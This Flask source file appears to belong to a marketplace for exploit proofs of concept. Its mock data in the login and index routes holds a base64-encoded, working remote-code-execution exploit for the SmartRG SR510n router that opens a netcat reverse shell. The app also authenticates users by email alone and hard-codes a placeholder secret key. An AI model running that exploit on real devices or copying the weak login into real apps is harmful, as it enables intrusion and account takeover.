from flask import Flask, redirect, url_for, request, session, render_template
import flask_login
import base64

from costants import USERS

app = Flask(__name__)
app.secret_key = 'super secret string'  # Change this!

login_manager = flask_login.LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

@app.template_filter("base64_decode")
def base64_decode(value):
    return base64.b64decode(value).decode('utf-8')

class User(flask_login.UserMixin):
    pass

@login_manager.user_loader
def user_loader(username):
    if username not in USERS:
        return

    user = User()
    user.id = username
    return user


@login_manager.request_loader
def request_loader(request):
    email = request.form.get('email')
    if email not in USERS:
        return

    user = User()
    user.id = email
    return user


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form['username']
    if username in USERS and request.form['password'] == USERS[username]['password']:
        user = User()
        user.id = username
        flask_login.login_user(user)

        # abi = []
        # with open("BAToken_ABI.json", "r") as abi_file:
        #     abi = json.load(abi_file)

        # pocs = retrieve_pocs(
        #     "0x3c2A6b61D7F858B4b4f559747EBfdfD01312BD10", 
        #     "0x9CdD33DC398DD1f00c9A63F32b58513447DC20bf", 
        #     "http://127.0.0.1:7545", 
        #     abi
        # )
        pocs = [(i, '0x15f03733e1f6b1E08332297d338ca4DabfAAC34d', 'IyBFeHBsb2l0IFRpdGxlOiBTbWFydFJHIFJvdXRlciBTUjUxMG4gMi42LjEzIC0gUkNFIChSZW1vdGUgQ29kZSBFeGVjdXRpb24pCiMgRGF0ZTogMTMvMDYvMjAyMgojIEV4cGxvaXQgQXV0aG9yOiBZZXJvZGluIFJpY2hhcmRzCiMgVmVuZG9yIEhvbWVwYWdlOiBodHRwczovL2FkdHJhbi5jb20KIyBWZXJzaW9uOiAyLjUuMTUgLyAyLjYuMTMgKGNvbmZpcm1lZCkKIyBUZXN0ZWQgb246IFNSNTA2biAoMi41LjE1KSAmIFNSNTEwbiAoMi42LjEzKQojIENWRSA6IENWRS0yMDIyLTM3NjYxCgppbXBvcnQgcmVxdWVzdHMKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbiwgUElQRQoKcm91dGVyX2hvc3QgPTNEICJodHRwOi8vMTkyLjE2OC4xLjEiCmF1dGhvcml6YXRpb25faGVhZGVyID0zRCAiWVdSdGFXNDZRV1J0TVc1QVRERnRNeU09M0QiCgpsaG9zdCA9M0QgImxvIgpscG9ydCA9M0QgODAKCnBheWxvYWRfcG9ydCA9M0QgODEKCgpkZWYgbWFpbigpOgogICAgZV9wcm9jID0zRCBQb3BlbihbImVjaG8iLCBmInJtIC90bXAvcyAmIG1rbm9kIC90bXAvcyBwICYgL2Jpbi9zaCAwPCAvdG09CnAvcyB8IG5jIHtsaG9zdH0ge2xwb3J0fSA+IC90bXAvcyJdLCBzdGRvdXQ9M0RQSVBFKQogICAgUG9wZW4oWyJuYyIsICItbmx2cCIsIGYie3BheWxvYWRfcG9ydH0iXSwgc3RkaW49M0RlX3Byb2Muc3Rkb3V0KQogICAgc2VuZF9wYXlsb2FkKGYifG5jIHtsaG9zdH0ge3BheWxvYWRfcG9ydH18c2giKQogICAgcHJpbnQoImRvbmUuLiBjaGVjayBzaGVsbCIpCgoKZGVmIGdldF9zZXNzaW9uKCk6CiAgICB1cmwgPTNEIHJvdXRlcl9ob3N0ICsgIi9hZG1pbi9waW5nLmh0bWwiCiAgICBoZWFkZXJzID0zRCB7IkF1dGhvcml6YXRpb24iOiAiQmFzaWMge30iLmZvcm1hdChhdXRob3JpemF0aW9uX2hlYWRlcil9CiAgICByID0zRCByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPTNEaGVhZGVycykudGV4dAogICAgaSA9M0Qgci5maW5kKCImc2Vzc2lvbktleT0zRCIpICsgbGVuKCImc2Vzc2lvbktleT0zRCIpCiAgICBzID0zRCAiIgogICAgd2hpbGUgcltpXSAhPTNEICInIjoKICAgICAgICBzID0zRCBzICsgcltpXQogICAgICAgIGkgPTNEIGkgKyAxCiAgICByZXR1cm4gcwoKCmRlZiBzZW5kX3BheWxvYWQocGF5bG9hZCk6CiAgICBwcmludChwYXlsb2FkKQogICAgdXJsID0zRCByb3V0ZXJfaG9zdCArICIvYWRtaW4vcGluZ0hvc3QuY21kIgogICAgaGVhZGVycyA9M0QgeyJBdXRob3JpemF0aW9uIjogIkJhc2ljIHt9Ii5mb3JtYXQoYXV0aG9yaXphdGlvbl9oZWFkZXIpfQogICAgcGFyYW1zID0zRCB7ImFjdGlvbiI6ICJhZGQiLCAidGFyZ2V0SG9zdEFkZHJlc3MiOiBwYXlsb2FkLCAic2Vzc2lvbktleSI9CjogZ2V0X3Nlc3Npb24oKX0KICAgIHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9M0RoZWFkZXJzLCBwYXJhbXM9M0RwYXJhbXMpLnRleHQKCgptYWluKCkKICAgICAgICAgICAg', 'python', b'\x13\xaa\x0f\xc9\x11]\xd5\xa6\xea>\xae\xf3\x1dWtY-G&{\x11\x14\xc1\x11\xa9\x88\x1f\x7f\x9e\xa6\x11\xb2', 3, '2022-37661', 'Remote', 'SmartRG Router SR510n 2.6.13 - Remote Code Execution', False, [], []) for i in range(0, 10)]
        address="0x0FAa2dDF12596B9bbFc354a90f38EbC3a539e56d"

        return redirect(url_for('index', pocs=pocs, account=address, username=username))

    return 'Bad login'

@app.route('/publish', methods=['GET', 'POST'])
@flask_login.login_required
def publish():
    username=flask_login.current_user.id

    if request.method == 'GET':
        return render_template("publish.html", username=username)
    
    print("post for publish")
    return redirect(url_for('publish',  username=username))


@app.route('/')
@flask_login.login_required
def index():

    # abi = []
    # with open("BAToken_ABI.json", "r") as abi_file:
    #     abi = json.load(abi_file)

    # pocs = retrieve_pocs(
    #     "0x3c2A6b61D7F858B4b4f559747EBfdfD01312BD10", 
    #     "0x9CdD33DC398DD1f00c9A63F32b58513447DC20bf", 
    #     "http://127.0.0.1:7545", 
    #     abi
    # )

    pocs = [(i, '0x15f03733e1f6b1E08332297d338ca4DabfAAC34d', 'IyBFeHBsb2l0IFRpdGxlOiBTbWFydFJHIFJvdXRlciBTUjUxMG4gMi42LjEzIC0gUkNFIChSZW1vdGUgQ29kZSBFeGVjdXRpb24pCiMgRGF0ZTogMTMvMDYvMjAyMgojIEV4cGxvaXQgQXV0aG9yOiBZZXJvZGluIFJpY2hhcmRzCiMgVmVuZG9yIEhvbWVwYWdlOiBodHRwczovL2FkdHJhbi5jb20KIyBWZXJzaW9uOiAyLjUuMTUgLyAyLjYuMTMgKGNvbmZpcm1lZCkKIyBUZXN0ZWQgb246IFNSNTA2biAoMi41LjE1KSAmIFNSNTEwbiAoMi42LjEzKQojIENWRSA6IENWRS0yMDIyLTM3NjYxCgppbXBvcnQgcmVxdWVzdHMKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbiwgUElQRQoKcm91dGVyX2hvc3QgPTNEICJodHRwOi8vMTkyLjE2OC4xLjEiCmF1dGhvcml6YXRpb25faGVhZGVyID0zRCAiWVdSdGFXNDZRV1J0TVc1QVRERnRNeU09M0QiCgpsaG9zdCA9M0QgImxvIgpscG9ydCA9M0QgODAKCnBheWxvYWRfcG9ydCA9M0QgODEKCgpkZWYgbWFpbigpOgogICAgZV9wcm9jID0zRCBQb3BlbihbImVjaG8iLCBmInJtIC90bXAvcyAmIG1rbm9kIC90bXAvcyBwICYgL2Jpbi9zaCAwPCAvdG09CnAvcyB8IG5jIHtsaG9zdH0ge2xwb3J0fSA+IC90bXAvcyJdLCBzdGRvdXQ9M0RQSVBFKQogICAgUG9wZW4oWyJuYyIsICItbmx2cCIsIGYie3BheWxvYWRfcG9ydH0iXSwgc3RkaW49M0RlX3Byb2Muc3Rkb3V0KQogICAgc2VuZF9wYXlsb2FkKGYifG5jIHtsaG9zdH0ge3BheWxvYWRfcG9ydH18c2giKQogICAgcHJpbnQoImRvbmUuLiBjaGVjayBzaGVsbCIpCgoKZGVmIGdldF9zZXNzaW9uKCk6CiAgICB1cmwgPTNEIHJvdXRlcl9ob3N0ICsgIi9hZG1pbi9waW5nLmh0bWwiCiAgICBoZWFkZXJzID0zRCB7IkF1dGhvcml6YXRpb24iOiAiQmFzaWMge30iLmZvcm1hdChhdXRob3JpemF0aW9uX2hlYWRlcil9CiAgICByID0zRCByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPTNEaGVhZGVycykudGV4dAogICAgaSA9M0Qgci5maW5kKCImc2Vzc2lvbktleT0zRCIpICsgbGVuKCImc2Vzc2lvbktleT0zRCIpCiAgICBzID0zRCAiIgogICAgd2hpbGUgcltpXSAhPTNEICInIjoKICAgICAgICBzID0zRCBzICsgcltpXQogICAgICAgIGkgPTNEIGkgKyAxCiAgICByZXR1cm4gcwoKCmRlZiBzZW5kX3BheWxvYWQocGF5bG9hZCk6CiAgICBwcmludChwYXlsb2FkKQogICAgdXJsID0zRCByb3V0ZXJfaG9zdCArICIvYWRtaW4vcGluZ0hvc3QuY21kIgogICAgaGVhZGVycyA9M0QgeyJBdXRob3JpemF0aW9uIjogIkJhc2ljIHt9Ii5mb3JtYXQoYXV0aG9yaXphdGlvbl9oZWFkZXIpfQogICAgcGFyYW1zID0zRCB7ImFjdGlvbiI6ICJhZGQiLCAidGFyZ2V0SG9zdEFkZHJlc3MiOiBwYXlsb2FkLCAic2Vzc2lvbktleSI9CjogZ2V0X3Nlc3Npb24oKX0KICAgIHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9M0RoZWFkZXJzLCBwYXJhbXM9M0RwYXJhbXMpLnRleHQKCgptYWluKCkKICAgICAgICAgICAg', 'python', b'\x13\xaa\x0f\xc9\x11]\xd5\xa6\xea>\xae\xf3\x1dWtY-G&{\x11\x14\xc1\x11\xa9\x88\x1f\x7f\x9e\xa6\x11\xb2', 3, '2022-37661', 'Remote', 'SmartRG Router SR510n 2.6.13 - Remote Code Execution', False, [], []) for i in range(0, 10)]
    balance = 10
    address="0x0FAa2dDF12596B9bbFc354a90f38EbC3a539e56d"
    username=flask_login.current_user.id

    return render_template("index.html", pocs=pocs, balance=balance, address=address, username=username)

@app.route("/logout")
@flask_login.login_required
def logout():
    flask_login.logout_user()
    return redirect(url_for("login"))